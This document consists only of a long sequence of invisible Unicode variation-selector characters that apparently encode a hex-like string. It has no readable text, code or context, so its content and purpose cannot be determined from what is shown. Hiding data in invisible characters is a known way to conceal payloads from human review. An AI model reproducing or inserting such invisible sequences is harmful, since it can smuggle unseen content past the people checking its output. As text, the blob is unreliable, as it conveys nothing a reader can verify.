󠅔󠄢󠄢󠅔󠄧󠄦󠄩󠄥󠄦󠄢󠅔󠄥󠅓󠅔󠄥󠄠󠅖󠄩󠄢󠅑󠄨󠄩󠅕󠄣󠄨󠄡󠄥󠅓󠄢󠄩󠄡󠅓󠅕󠄠󠄧󠄦󠄣󠄣󠄡󠄣󠄥󠄡󠄩󠄨󠄦󠄢󠄠󠄢󠅖󠄡󠄤󠅓󠅒󠅑󠄢󠅔󠅒󠄧󠅑󠅔󠄣󠅕󠄦󠄨󠅒󠄨󠄣󠅔󠅑󠅑󠄩󠄢󠄧󠅖󠄥󠄩󠅕󠅕󠅒󠄨󠅔󠄦󠄡󠅔󠄨󠅓󠄢󠄦󠄣󠅖󠅓󠄧󠄡󠄥󠄤󠄢󠄩󠄢󠅖󠄥󠅖󠄥󠄩󠅕󠄦󠅔󠄤󠅕󠅕󠄡󠄤󠄢󠄣󠄧󠅖󠄢󠄩󠄦󠄤󠄠󠄠󠄩󠄡󠄨󠄠󠄦󠅓󠄤󠄡󠅓󠄣󠄥󠄧󠅔󠄠󠅒󠅖󠄤󠄧󠅒󠅔󠄢󠄧󠅑󠄤󠄤󠄨󠅒󠅖󠅕󠄨󠄡󠄢󠅓󠅒󠄡󠄡󠄢󠄢󠅔󠄦󠄠󠅑󠄢󠄧󠅖󠄧󠅖󠅖󠅑󠄢󠅕󠄦󠄣󠅕󠅔󠅑󠄧󠅕󠄨󠅓󠄤󠄠󠄩󠄠󠅔󠅑󠄩󠅔󠄢󠅑󠅓󠅒󠄥󠅑󠄤󠄢󠄦󠄩󠅔󠅑󠄦󠄣󠄠󠄦󠅓󠄣󠄤󠄡󠄢󠅑󠄦󠅒󠄢󠄢󠄥󠄢󠄧󠄣󠅔󠄠󠄡󠄩󠄧󠅕󠅑󠅕󠄦󠅔󠄢󠄥󠄠󠅑󠄩󠅖󠄩󠄧󠄠󠄨󠄢󠄠󠄨󠅕󠅕󠄦󠅔󠄩󠅑󠄣󠄠󠄦󠄥󠄨󠅔󠄣󠅕󠄠󠅓󠄤󠄢󠅓󠄥󠄢󠅓󠄡󠄧󠅑󠄦󠄦󠄣󠅑󠅑󠅔󠅒󠄢󠅑󠅒󠅖󠅓󠄩󠅔󠄢󠅓󠄩󠄨󠄦󠅓󠅒󠅒󠅒󠄧󠅓󠄣󠄤󠅒󠄧󠄣󠄡󠅕󠄠󠅑󠄤󠄤󠄨󠅒󠅒󠄠󠄩󠅒󠅔󠅓󠄣󠄦󠅓󠄩󠄣󠄦󠄢󠄩󠄦󠄠󠄥󠄡󠄩󠅕󠅑󠄨󠄠󠄩󠅔󠄣󠄤󠅕󠄢󠄤󠄤󠄣󠄦󠄥󠅔󠅖󠅖󠄣󠅔󠄦󠅑󠅒󠅖󠅓󠅑󠄣󠄥󠄦󠄤󠄠󠅕󠅖󠄡󠄡󠅕󠄣󠄧󠄦󠅔󠅒󠄨󠅓󠅑󠄨󠅑󠅓󠄨󠄤󠅑󠅑󠄣󠄥󠅖󠄦󠄣󠅕󠄠󠄣󠄤󠅕󠄢󠄤󠄠󠄨󠄨󠄦󠄦󠅑󠄩󠅖󠄠󠄧󠄣󠄤󠄦󠅒󠄣󠄠󠄧󠄡󠄨󠄩󠄡󠄠󠄡󠄠󠄢󠅕󠄥󠅒󠄢󠄣󠅖󠅒󠄣󠄣󠅕󠅑󠄩󠄥󠄩󠅒󠅓󠄧󠅔󠅓󠄦󠅑󠄤󠅓󠄤󠅖󠄧󠅕󠄦󠄠󠄠󠄡󠅖󠅒󠄥󠄧󠄩󠅕󠅔󠄡󠅕󠄠󠅓󠄤󠄠󠅓󠄨󠄦󠄡󠄣󠄧󠅔󠅓󠄤󠄡󠄨󠅔󠄦󠄠󠄧󠅖󠅓󠅑󠄠󠄣󠄥󠄢󠄢󠄨󠄣󠄦󠅔󠅒󠄩󠅑󠄣󠅖󠅔󠅕󠅖󠅒󠅑󠅕󠄢󠄣󠅕󠄩󠄢󠄩󠅔󠄤󠄣󠅔󠄥󠅒󠄧󠅔󠅒󠄥󠅔󠅑󠄥󠄢󠄦󠄤󠅑󠅕󠄦󠅑󠄡󠅖󠄠󠄨󠅑󠅕󠄧󠄧󠄧󠄧󠄦󠄦󠅔󠅑󠅕󠄣󠄦󠅖󠅖󠄣󠅖󠄣󠅖󠅑󠄨󠄠󠄥󠄠󠄥󠄠󠄢󠄤󠅑󠄥󠄡󠄡󠅔󠄥󠅖󠄦󠄦󠅒󠄢󠄠󠄥󠄣󠄨󠄤󠄠󠅔󠄢󠄢󠅖󠄣󠄩󠄥󠅖󠅒󠅑󠄦󠅓󠅓󠄣󠄠󠄣󠄠󠅒󠄡󠄤󠄧󠄧󠅑󠄣󠅓󠅓󠄤󠅑󠄤󠅔󠅔󠅖󠄧󠄤󠄩󠄢󠄥󠅓󠅒󠄠󠄩󠄦󠄦󠄧󠄠󠅑󠄦󠄢󠄡󠄡󠄣󠄧󠄧󠅔󠅔󠄢󠅕󠅔󠅓󠄦󠅕󠄥󠅓󠅒󠄦󠄦󠅑󠄣󠅒󠅕󠅕󠄥󠄨󠄨󠅒󠄡󠅓󠅔󠅕󠄢󠄦󠄤󠅑󠄨󠅕󠄧󠅖󠄡󠅒󠄢󠅖󠄩󠄣󠄠󠄤󠅒󠄡󠄥󠄥󠄠󠄣󠄤󠄧󠄩󠄩󠄨󠄧󠄥󠅕󠄨󠄢󠅑󠅒󠄠󠅒󠄥󠄦󠄨󠄧󠅖󠄢󠄡󠄨󠄠󠅖󠄦󠄧󠄣󠄧󠄨󠄦󠄡󠅒󠄩󠄢󠄧󠄡󠅕󠄦󠄩󠄩󠄠󠄤󠄧󠄤󠄤󠅕󠄩󠅖󠅕󠅓󠄧󠄣󠄦󠄡󠅔󠄣󠅔󠄢󠄣󠅑󠄦󠄣󠄢󠄠󠄥󠄢󠅓󠅓󠄧󠄢󠄢󠅓󠅕󠄢󠄡󠅕󠅔󠄠󠅔󠅒󠄤󠄩󠅓󠄣󠄨󠅒󠄤󠄩󠅓󠅕󠅔󠄥󠅕󠄦󠄤󠅓󠅔󠄠󠄥󠅖󠅖󠄥󠄢󠄦󠄩󠄨󠅑󠄣󠄣󠄤󠅓󠅓󠅖󠄧󠅑󠅓󠅓󠅖󠄧󠄠󠅑󠅔󠄩󠄤󠅕󠅔󠅕󠄦󠅖󠄩󠄩󠅒󠅑󠄢󠄠󠅑󠅑󠅓󠄤󠄥󠅑󠅒󠅓󠄢󠄠󠄧󠄢󠅕󠄨󠅖󠄥󠄣󠅖󠅕󠅔󠅖󠅕󠅕󠅖󠄨󠄤󠅑󠄠󠄤󠅔󠄦󠅑󠄢󠅒󠅓󠄥󠄦󠅑󠄩󠄩󠅓󠄦󠄦󠄥󠅑󠄨󠄥󠄥󠄦󠄨󠄥󠄩󠅔󠄦󠅖󠄠󠅔󠅑󠄢󠄦󠄠󠄥󠄠󠄤󠅒󠅑󠄧󠄩󠅓󠄧󠅒󠄥󠅔󠄥󠄩󠄦󠄥󠅓󠅑󠄨󠄡󠄨󠅖󠄩󠄨󠄤󠅑󠄢󠄢󠄣󠄢󠅔󠄦󠄧󠅒󠅑󠅑󠄩󠄥󠄠󠄥󠄢󠄩󠄠󠄢󠄩󠄨󠄧󠄨󠅑󠅕󠄩󠅓󠅖󠄦󠅓󠄣󠄣󠄤󠄢󠄨󠄦󠅓󠅖󠄤󠅒󠄢󠄦󠅑󠄨󠄠󠄡󠅖󠅔󠄦󠄨󠄡󠄧󠅑󠄠󠄠󠄨󠅖󠅔󠄦󠄦󠄧󠄦󠅔󠅒󠅕󠄦󠅒󠅓󠅑󠅒󠅕󠄥󠄦󠄦󠅒󠅖󠅔󠄦󠄧󠅕󠄧󠄡󠄠󠅒󠄧󠅔󠄠󠅓󠄠󠅔󠄡󠄧󠄠󠄡󠅒󠄥󠄦󠅕󠅖󠄠󠄦󠄧󠄢󠄢󠅑󠄡󠄩󠅖󠅑󠅕󠅔󠅔󠄣󠄢󠅕󠄥󠄨󠄤󠄢󠅕󠄦󠄨󠅖󠄨󠅔󠄥󠄢󠄣󠄦󠅕󠅓󠄠󠄤󠄤󠄤󠅓󠄩󠄡󠅓󠄨󠄣󠅕󠄤󠅖󠄤󠄩󠅖󠄦󠅑󠄣󠅕󠅒󠄢󠅒󠄧󠄩󠅕󠅒󠅑󠄠󠄧󠅒󠄨󠅕󠄦󠄣󠄣󠄨󠄢󠅖󠄡󠄧󠄩󠅓󠅒󠅕󠄦󠅓󠄢󠄤󠅕󠄧󠄡󠄦󠄣󠅕󠅑󠄣󠄦󠄢󠄡󠅔󠄢󠄨󠄥󠅓󠄧󠄥󠄤󠅔󠄢󠄤󠅓󠅑󠄥󠄩󠅒󠄨󠄩󠄤󠅑󠄠󠅕󠄠󠅔󠄠󠄡󠄢󠅓󠅖󠅓󠄤󠅓󠅒󠄤󠄨󠄦󠄥󠅕󠅖󠅑󠄣󠅓󠄣󠅕󠄤󠄤󠅔󠅖󠄢󠄠󠅓󠅔󠄢󠅑󠄢󠅑󠅓󠄨󠄥󠅖󠅖󠅓󠅑󠄤󠄡󠄥󠄢󠅓󠄥󠄨󠅓󠄨󠄥󠄨󠄣󠅒󠄡󠄠󠄥󠅕󠄠󠄧󠄩󠅕󠄧󠄢󠅑󠄡󠅑󠅕󠄨󠅕󠄦󠄡󠅔󠄠󠄡󠄦󠄨󠄥󠄥󠅔󠄡󠅓󠅔󠅔󠄠󠄡󠄧󠅑󠄧󠄢󠄧󠅖󠄡󠄢󠅒󠄢󠄥󠅒󠅖󠄧󠄩󠅑󠄦󠄠󠄧󠄩󠄥󠄢󠄦󠄩󠄡󠄨󠄡󠄣󠄢󠄣󠄨󠄧󠅒󠄢󠄠󠄢󠄦󠄧󠅖󠄣󠄣󠄥󠄤󠄠󠅔󠄥󠄧󠄩󠄣󠄩󠅔󠄡󠄤󠄦󠄥󠄣󠄠󠅕󠄨󠅖󠅑󠄠󠄨󠅖󠄢󠄥󠅑󠅓󠄢󠄡󠄡󠅕󠄩󠄥󠅓󠄨󠄧󠄣󠄧󠅒󠄤󠄠󠄡󠄢󠄥󠅑󠅒󠅖󠄦󠄥󠄦󠅕󠄧󠄩󠄣󠅑󠅑󠅖󠅓󠄣󠄢󠅕󠅑󠄡󠅕󠄤󠄩󠄢󠄦󠅓󠄧󠅑󠄧󠅖󠄨󠄠󠄩󠄧󠄤󠅖󠄠󠄧󠅕󠅒󠄨󠅑󠅑󠄠󠅑󠄣󠅒󠅑󠅓󠅖󠅖󠄧󠄩󠄧󠄦󠄠󠄢󠅒󠄣󠄤󠄤󠅖󠄡󠅒󠄢󠄤󠄣󠄣󠄣󠅔󠄡󠅕󠅔󠄢󠅔󠄡󠅔󠄤󠅕󠄠󠅕󠅒󠄡󠅓󠅓󠄧󠄩󠄦󠄩󠄠󠄥󠅒󠄢󠄧󠅖󠄨󠄩󠅓󠄢󠅕󠄨󠅔󠄥󠅖󠅒󠄦󠄣󠄦󠄢󠄥󠄤󠄣󠄦󠄨󠄨󠄨󠄧󠅔󠅓󠄨󠅑󠄦󠄠󠅔󠅖󠄤󠅔󠄥󠄥󠄢󠄦󠄢󠅖󠅖󠅔󠄤󠅒󠅕󠅔󠅑󠅔󠄧󠄨󠄤󠅑󠄩󠄩󠅕󠅓󠄤󠄣󠄦󠅔󠅓󠅖󠅑󠅖󠄧󠄤󠄠󠄣󠄦󠄩󠄦󠄩󠅒󠄥󠄠󠄣󠄦󠅔󠄩󠅓󠅕󠄨󠄦󠄥󠄣󠄦󠄢󠅒󠄦󠅒󠅕󠅓󠄥󠄢󠅒󠄦󠄤󠅕󠄩󠅒󠄦󠄢󠅔󠄡󠅕󠄡󠄩󠄣󠄢󠄢󠄦󠄩󠅑󠄤󠅒󠅓󠅓󠄦󠄠󠄤󠄥󠅓󠄠󠅕󠅑󠄩󠄢󠅓󠄡󠄣󠄦󠄩󠅔󠅓󠄥󠅒󠅖󠅓󠄤󠅖󠅓󠄡󠅒󠄨󠄨󠅕󠄨󠄢󠄩󠄡󠄤󠄤󠅔󠄣󠅕󠅑󠄡󠅓󠅓󠅖󠅖󠄩󠄠󠄡󠅓󠄤󠅓󠅑󠄦󠄦󠄧󠄦󠄥󠄨󠄥󠅕󠅓󠄦󠄡󠄢󠄩󠅓󠅑󠄧󠄣󠄣󠅖󠅔󠄥󠄦󠄨󠅒󠄠󠅓󠄡󠅖󠄥󠄦󠅒󠅕󠄢󠅒󠅑󠅓󠄣󠅔󠅓󠄢󠄦󠄩󠅕󠄡󠄧󠅒󠄠󠄤󠄢󠅑󠄩󠅖󠅒󠄠󠄩󠄠󠄥󠅑󠄩󠄤󠅓󠅕󠅓󠅔󠅔󠅒󠄢󠄩󠅔󠄣󠄡󠅕󠅓󠅕󠅕󠄠󠄩󠄡󠄦󠅖󠅑󠄤󠅕󠅖󠄢󠅓󠄥󠄧󠅖󠅖󠄩󠅕󠄧󠄠󠄨󠄤󠄥󠄣󠅖󠄥󠄥󠅒󠄢󠅑󠅔󠄥󠄨󠅖󠄩󠄧󠅒󠄨󠅒󠅖󠄤󠄣󠅓󠄤󠅕󠄤󠅒󠄣󠅕󠄣󠅖󠅒󠄨󠅖󠄧󠄧󠅓󠄠󠅒󠅒󠄩󠅖󠄨󠄠󠄤󠄠󠄩󠄨󠄨󠄨󠄨󠅓󠄣󠄦󠄣󠄩󠅓󠄠󠄢󠄦󠅕󠄧󠄦󠅒󠄠󠄠󠅒󠄥󠅔󠄨󠅔󠄣󠅑󠄢󠄦󠅕󠅒󠄤󠄣󠄠󠄣󠄥󠅓󠅑󠄥󠄢󠄡󠄢󠄤󠅕󠅒󠄣󠄠󠄨󠅑󠄡󠅓󠅒󠄡󠅒󠄦󠄤󠄦󠄢󠄦󠄣󠅒󠄦󠄢󠅔󠄡󠄣󠅓󠄥󠄦󠅕󠄡󠄥󠅒󠅕󠄨󠅓󠄧󠅖󠄩󠄦󠅕󠄡󠄧󠅔󠅔󠅖󠄢󠄠󠄨󠅕󠄥󠄤󠅖󠄥󠅒󠅔󠄨󠅒󠄢󠄤󠄨󠄤󠅓󠅔󠄩󠄤󠅑󠅕󠄣󠄤󠄥󠄧󠅒󠄢󠄢󠄢󠄥󠄡󠄡󠄣󠅕󠄠󠅑󠄥󠄥󠅓󠄡󠅒󠅓󠅒󠅕󠄢󠄤󠅕󠄧󠅕󠄠󠅖󠅓󠅓󠄦󠄢󠄦󠄧󠄥󠄡󠄤󠄧󠄤󠄤󠅕󠄣󠄥󠄧󠄡󠄩󠄣󠄣󠅖󠅔󠄢󠄥󠄧󠄣󠄧󠅑󠄡󠄢󠄡󠅕󠅑󠅖󠄨󠄨󠄣󠄣󠄦󠄨󠄣󠄦󠅒󠄣󠄦󠅒󠅒󠄥󠄧󠄠󠄢󠄢󠄣󠅒󠄣󠄨󠄡󠅑󠄦󠄨󠅕󠄠󠄠󠅕󠅒󠄣󠅑󠅖󠄤󠄩󠅒󠄧󠄩󠄧󠅑󠄧󠅑󠅖󠄣󠅑󠄤󠄠󠄤󠅔󠄤󠄤󠅕󠄡󠅓󠄢󠄣󠅕󠅕󠄢󠄥󠅑󠅓󠄤󠅑󠄥󠄦󠄥󠅔󠄣󠄢󠄣󠄥󠄥󠄢󠄤󠅓󠄤󠄢󠄥󠄨󠄦󠄡󠄩󠄠󠄩󠅓󠅖󠅕󠄧󠅒󠄤󠅔󠄤󠅒󠄩󠅑󠄢󠄡󠄩󠄧󠅕󠅑󠄢󠄣󠅕󠄣󠄦󠅖󠄣󠅒󠄧󠄢󠄨󠅑󠄠󠄢󠄧󠄤󠄡󠄧󠄧󠄧󠄦󠄣󠅑󠅕󠄨󠅖󠄦󠄢󠄧󠄨󠄥󠄤󠄥󠄢󠄩󠅑󠅔󠅓󠄥󠅑󠄢󠄨󠄨󠅑󠄨󠅑󠄥󠄧󠄩󠅖󠄨󠄤󠄦󠅑󠄣󠄩󠄧󠄦󠅑󠄨󠄡󠄥󠄡󠄤󠄧󠅑󠅑󠄦󠄧󠅒󠄥󠅑󠅔󠄦󠅖󠅓󠄦󠅕󠅕󠄠󠄨󠅖󠄦󠅔󠅖󠄠󠄡󠄡󠅓󠄠󠄡󠅔󠄡󠅓󠄧󠅔󠅖󠄨󠄥󠅔󠅒󠅖󠅕󠅒󠄤󠄨󠅓󠄨󠄢󠅑󠄦󠅓󠄤󠄣󠄣󠅓󠄣󠄦󠄤󠄩󠅑󠄥󠄤󠄧󠅓󠅔󠄢󠅓󠄤󠅒󠄥󠄢󠄩󠄥󠄠󠄨󠅓󠄧󠄨󠄥󠅓󠄠󠄢󠄤󠅔󠄧󠅓󠅔󠄥󠄠󠄢󠅔󠄦󠅖󠄡󠄦󠄥󠅑󠄤󠅕󠄨󠄩󠅔󠄢󠅓󠄧󠄤󠅔󠄣󠄩󠅕󠄦󠄡󠅔󠄢󠅕󠄢󠅕󠅕󠄠󠅕󠄩󠄩󠄣󠅕󠅖󠄣󠄢󠅕󠅒󠅔󠄡󠅒󠅑󠄣󠅕󠄨󠄠󠅔󠅔󠅑󠄩󠄩󠄣󠅔󠄠󠄩󠅓󠄥󠄢󠄨󠅔󠄥󠄨󠄦󠄡󠄠󠄦󠄠󠄣󠄦󠅕󠄠󠄥󠄨󠅖󠅖󠅖󠄩󠄣󠄧󠄣󠄢󠅑󠄩󠅑󠄣󠄣󠄦󠄤󠄣󠅔󠄩󠅒󠅑󠅑󠅕󠅓󠄠󠅑󠅑󠅑󠅒󠄠󠄥󠅖󠄣󠄡󠄡󠅓󠅖󠅔󠄠󠄨󠄢󠅒󠄠󠄢󠄧󠅔󠄢󠅔󠄥󠄩󠄥󠄢󠅒󠅓󠄡󠄣󠄠󠅒󠅕󠅖󠄥󠅕󠅑󠄨󠅑󠄤󠄠󠄦󠅓󠄠󠄢󠄡󠅓󠅒󠄢󠅒󠄣󠄡󠄧󠄨󠅕󠅓󠅓󠄧󠄠󠄡󠄩󠅔󠅕󠅑󠄢󠄨󠄥󠅕󠅖󠄦󠄡󠄦󠄤󠄦󠄣󠅕󠅕󠅑󠄧󠄦󠅕󠅓󠄦󠅓󠄡󠄩󠄡󠄥󠅖󠄤󠅒󠅓󠅔󠄧󠅒󠄥󠅔󠅒󠄥󠄡󠄥󠄣󠅓󠅔󠅑󠄡󠄦󠅒󠄢󠄢󠅑󠅖󠄣󠄤󠅔󠅖󠅖󠄡󠄥󠅓󠄤󠅕󠅕󠄡󠄧󠄩󠄦󠅑󠅑󠄠󠅑󠅒󠄠󠅒󠄤󠅓󠅖󠄤󠄥󠄦󠄤󠄧󠄣󠅒󠅓󠄩󠄧󠅔󠅕󠄠󠅔󠅕󠄤󠄦󠅕󠄨󠅓󠅔󠄡󠄢󠅕󠅔󠄠󠄦󠄣󠄧󠅑󠄣󠅖󠅖󠅕󠄧󠄩󠅑󠅔󠄥󠅓󠄦󠅑󠅕󠅕󠄨󠅑󠅕󠅑󠄥󠅖󠄥󠄧󠅒󠅒󠄢󠅓󠄨󠄢󠄧󠄤󠄥󠄣󠄣󠄠󠅓󠄦󠄢󠄨󠄧󠄢󠅑󠅖󠄤󠅖󠄢󠄧󠅓󠄩󠅖󠄧󠄢󠅑󠄩󠅒󠄤󠄣󠄠󠅖󠄥󠄤󠄧󠄥󠄧󠄩󠄠󠅓󠄦󠄢󠅔󠄤󠄥󠄠󠅒󠅓󠅑󠄢󠅕󠄤󠄧󠄧󠄦󠄡󠄧󠄦󠅕󠄥󠄤󠅓󠄠󠅓󠅕󠄦󠅒󠅓󠅑󠅒󠄡󠄥󠄧󠅒󠄨󠄥󠄧󠅑󠄠󠅕󠄢󠄧󠄠󠄣󠅔󠄤󠄥󠄠󠅔󠄡󠅕󠄩󠄠󠅕󠅖󠄩󠅑󠅔󠅑󠅔󠄢󠄢󠄥󠄧󠅕󠅓󠄢󠄠󠄢󠅖󠄤󠄠󠅒󠄣󠄠󠄧󠄤󠄡󠄢󠅔󠄢󠄣󠄨󠄦󠅖󠄨󠄠󠅕󠄦󠅑󠄤󠄥󠄤󠄠󠅑󠄨󠄦󠄢󠄩󠄩󠄩󠄧󠅔󠄢󠄡󠅒󠄡󠄤󠅒󠅖󠅖󠅖󠄨󠄨󠄤󠅔󠄦󠄨󠄥󠄥󠄥󠅔󠄦󠄠󠅑󠄠󠄣󠅕󠅓󠅕󠄦󠅓󠄧󠅖󠄡󠄥󠄤󠄥󠅒󠅓󠅓󠄢󠄦󠅑󠅖󠄩󠄡󠄦󠄡󠅔󠄡󠄡󠄥󠅖󠄩󠅕󠄠󠅓󠅓󠄩󠄢󠄦󠄢󠅒󠄡󠄧󠅓󠅒󠄧󠅔󠄥󠅕󠅖󠄧󠅑󠄨󠄧󠄠󠄥󠄨󠅖󠄦󠄣󠄥󠄠󠄣󠅓󠄤󠄥󠅑󠄡󠄥󠄥󠄢󠄤󠄥󠅒󠄨󠅕󠅑󠅔󠄡󠅓󠅓󠄨󠅓󠄩󠄧󠄨󠄥󠄡󠄤󠄥󠅒󠄥󠅓󠄣󠄨󠄦󠄣󠄠󠅒󠄣󠄢󠅑󠅑󠄤󠄤󠄣󠄣󠅒󠅓󠄩󠄩󠅑󠄤󠄤󠄢󠄧󠅑󠄣󠄥󠄩󠄣󠄤󠅕󠅒󠄥󠄥󠅕󠄠󠄣󠄡󠅕󠄩󠄡󠄨󠄤󠅕󠄢󠄥󠅓󠅖󠄧󠅒󠄨󠄣󠄡󠅒󠅑󠄧󠅔󠄣󠅒󠅖󠅒󠄥󠄤󠄢󠅖󠅖󠅑󠅕󠅑󠅔󠅑󠅒󠄥󠄠󠄨󠅑󠄥󠄥󠅖󠄡󠅑󠅔󠅑󠄨󠅕󠅕󠄥󠄧󠄨󠅑󠅓󠅓󠅔󠅓󠅒󠄡󠄢󠄡󠄨󠄠󠄦󠅓󠅖󠄠󠅑󠅑󠄣󠄡󠅓󠄦󠄦󠄩󠄥󠄤󠅓󠄥󠅕󠅒󠄦󠄧󠅓󠄤󠅔󠅓󠅖󠅒󠄨󠄢󠄦󠅓󠄧󠅒󠅖󠅓󠅔󠄦󠄧󠅔󠅑󠄨󠄡󠄧󠄨󠄡󠄣󠄩󠄥󠄧󠄧󠄡󠅑󠄥󠄠󠅒󠄠󠄧󠅒󠄥󠄨󠄧󠄨󠄥󠄠󠄢󠄡󠄩󠄤󠅒󠅔󠄢󠄦󠄢󠅕󠄨󠅕󠅑󠄧󠄡󠄣󠅕󠄥󠅖󠄧󠄧󠅖󠅑󠄥󠄣󠅖󠅔󠅒󠄠󠄡󠄡󠄧󠅔󠅒󠄨󠄤󠅔󠄧󠄥󠅓󠅒󠄨󠄦󠅒󠄧󠅕󠅔󠄤󠄦󠄣󠄥󠄡󠄧󠄩󠅓󠅑󠅑󠅖󠅓󠄤󠅒󠄣󠄩󠅔󠄨󠄨󠄢󠅒󠄡󠄨󠅕󠄦󠄠󠅓󠅖󠄨󠅑󠄡󠄢󠅑󠄠󠄩󠅑󠄩󠄥󠄩󠄢󠅑󠄦󠅔󠄩󠄥󠅒󠄤󠅑󠅔󠄦󠅒󠄢󠄤󠅔󠄠󠅕󠄦󠄦󠅔󠄧󠄤󠅖󠄠󠄢󠅔󠅕󠅓󠅓󠅖󠄣󠄦󠅖󠅕󠄨󠅖󠅖󠅒󠅔󠄦󠄢󠄩󠅖󠅔󠅔󠅕󠄦󠄦󠄣󠄩󠄨󠄩󠅖󠅒󠄣󠄣󠄡󠄣󠅖󠄧󠅖󠅓󠄩󠄠󠄨󠅓󠅑󠅔󠅒󠄡󠄡󠄠󠅖󠄣󠄡󠄠󠄦󠄤󠄩󠅔󠅖󠅒󠅑󠅖󠄦󠄤󠅖󠄢󠅓󠄩󠅔󠄤󠅖󠄦󠄨󠄤󠅖󠅒󠅑󠅑󠄢󠅒󠅕󠅒󠅔󠄦󠅒󠄨󠅔󠄡󠅕󠄡󠄨󠄠󠄢󠄨󠅔󠅒󠅒󠄢󠅖󠅕󠄤󠄠󠄣󠅔󠅑󠄦󠅓󠅖󠄤󠄡󠄦󠄦󠄤󠅒󠅕󠄧󠄡󠄡󠅕󠄩󠄤󠄧󠅑󠅒󠅑󠄤󠄨󠄩󠄡󠅕󠅕󠄤󠄩󠅒󠄦󠅓󠄥󠄣󠅒󠅓󠄧󠅕󠄦󠅓󠅖󠅔󠄧󠄡󠄣󠅔󠄣󠄢󠄨󠄤󠅑󠄣󠄧󠄦󠅔󠄥󠄧󠅔󠄠󠄡󠄦󠄣󠄥󠅑󠄣󠄦󠄧󠄧󠄡󠄠󠄡󠅑󠅕󠄤󠅕󠄥󠅑󠄨󠄩󠄢󠄥󠅓󠄥󠄨󠄢󠄠󠄧󠅕󠅖󠄤󠄡󠅖󠅒󠅖󠄨󠄢󠄨󠄤󠄠󠄩󠅓󠄢󠄢󠅖󠄨󠅔󠄢󠄧󠅒󠄥󠅕󠅒󠄤󠄡󠄩󠄦󠄥󠄤󠄨󠅖󠅓󠅖󠄡󠄠󠅕󠅕󠄠󠄨󠄠󠄦󠄥󠄩󠅕󠄩󠄥󠅑󠄤󠅒󠄩󠄨󠄧󠄦󠅒󠅔󠄦󠅒󠅓󠄥󠄦󠄨󠅒󠅑󠄦󠅖󠅓󠅒󠅔󠄨󠅑󠄩󠅕󠄩󠄨󠅓󠄢󠄢󠄤󠅖󠄣󠅔󠄩󠄣󠄢󠅕󠄤󠅖󠄩󠄣󠄠󠅔󠄡󠄡󠄦󠅑󠄠󠄩󠄢󠄧󠅕󠅓󠄦󠄧󠄩󠄢󠄩󠄠󠅒󠅖󠄧󠄠󠄦󠄢󠄧󠅔󠅓󠅓󠅑󠄩󠄤󠅖󠄨󠄦󠄩󠄦󠄩󠅖󠄩󠅑󠄨󠄦󠄣󠄦󠅔󠄡󠄧󠄧󠅒󠅔󠅑󠄩󠅖󠅑󠅕󠅑󠅒󠅔󠄣󠅕󠄩󠅓󠄥󠅕󠅖󠄧󠄧󠅒󠄠󠄦󠅕󠄢󠄢󠄡󠅕󠅔󠅖󠄦󠅑󠄠󠄥󠅑󠄠󠅔󠄦󠅖󠅖󠄥󠄩󠄢󠅓󠄨󠄤󠅕󠅑󠄣󠅑󠄠󠅖󠅔󠄢󠅔󠅔󠄩󠄣󠄡󠅕󠄢󠄨󠅒󠄦󠄩󠄣󠄦󠄢󠄥󠄣󠄨󠄦󠅔󠅖󠄤󠅓󠄨󠄣󠅔󠅕󠄥󠄤󠅖󠅑󠄤󠄦󠄥󠄠󠄨󠄨󠄣󠅒󠄡󠄦󠄥󠄣󠄠󠄢󠄢󠄢󠄥󠅑󠄧󠅖󠄦󠄡󠄤󠄤󠅒󠅕󠅓󠄠󠅔󠅖󠄦󠄣󠄡󠅔󠄡󠄩󠄢󠄠󠄠󠄩󠅒󠄦󠅕󠄠󠅒󠅑󠄥󠄩󠄢󠄧󠅖󠄠󠅔󠄧󠅔󠄤󠄢󠄥󠄧󠅕󠄠󠄣󠄤󠄨󠄣󠅕󠄩󠄣󠄡󠅒󠅖󠄢󠄩󠅓󠄡󠄡󠄡󠄩󠄨󠅔󠄠󠄡󠄧󠅑󠅖󠅔󠅒󠄢󠅔󠄡󠅒󠄨󠄢󠄡󠄦󠅒󠄥󠄦󠅒󠅑󠄨󠄢󠄣󠅓󠄣󠄡󠄦󠄩󠅔󠅑󠄣󠅓󠄣󠄨󠄨󠄤󠄨󠄩󠄧󠅒󠅓󠅑󠄢󠅔󠄦󠄩󠄧󠄡󠄡󠄩󠄤󠄨󠄢󠅒󠄩󠄥󠅕󠄠󠅓󠄨󠄨󠅓󠅔󠅓󠄥󠄡󠄤󠄢󠄩󠅕󠄩󠅓󠄤󠅓󠄠󠄡󠄥󠅔󠄡󠄣󠄤󠅔󠄤󠄥󠄥󠄩󠅒󠄤󠄦󠄣󠄥󠄥󠄢󠅔󠄤󠄦󠄠󠄧󠄡󠄢󠄡󠅔󠄦󠅑󠄦󠄠󠅖󠄤󠄤󠄥󠄡󠄢󠄠󠅖󠄠󠄤󠄡󠄦󠅔󠅒󠄣󠅖󠄢󠄥󠄤󠄠󠄧󠄠󠅑󠄦󠅔󠅖󠄣󠅔󠅒󠅒󠄣󠄤󠄣󠄡󠅔󠄣󠅓󠄥󠄡󠄠󠅔󠄣󠄣󠄩󠄠󠄦󠄦󠄤󠅔󠄣󠅔󠅔󠄧󠅒󠄣󠄩󠅑󠅑󠅔󠄢󠅓󠄨󠅒󠄣󠄩󠅔󠄡󠄢󠄣󠄠󠅕󠄣󠄠󠄨󠅒󠅔󠄡󠄥󠄤󠄨󠄣󠄦󠄩󠄣󠄣󠄦󠅕󠄣󠅒󠄦󠄥󠄨󠅒󠄠󠄠󠄩󠄩󠅔󠄤󠄦󠅑󠅕󠅓󠄦󠄢󠄦󠄤󠄧󠄤󠄠󠄩󠅖󠄩󠄣󠄤󠄢󠄡󠄥󠄩󠄧󠄥󠅑󠅕󠄧󠄧󠄢󠄨󠅒󠄩󠅔󠄢󠅓󠄦󠄨󠄡󠄨󠄥󠅒󠄤󠅖󠄥󠄠󠅔󠅕󠄦󠅔󠄢󠄢󠄤󠄦󠅖󠅔󠅑󠄧󠄩󠅔󠅔󠄨󠄠󠄡󠄤󠄥󠅖󠅖󠄧󠄩󠅑󠄩󠄥󠄩󠅑󠅓󠄦󠄥󠅒󠄨󠄢󠅔󠄨󠄦󠅓󠄡󠅖󠄨󠄩󠄡󠅓󠅖󠄥󠄠󠄠󠄣󠄦󠄢󠄤󠄠󠅖󠄦󠄠󠄧󠄥󠅒󠅔󠅑󠄢󠄥󠄤󠄩󠅑󠄦󠄥󠄩󠅓󠅕󠅑󠄥󠄩󠅔󠄡󠅑󠄢󠅑󠄧󠅕󠄦󠅓󠄦󠄢󠅑󠄦󠅔󠄩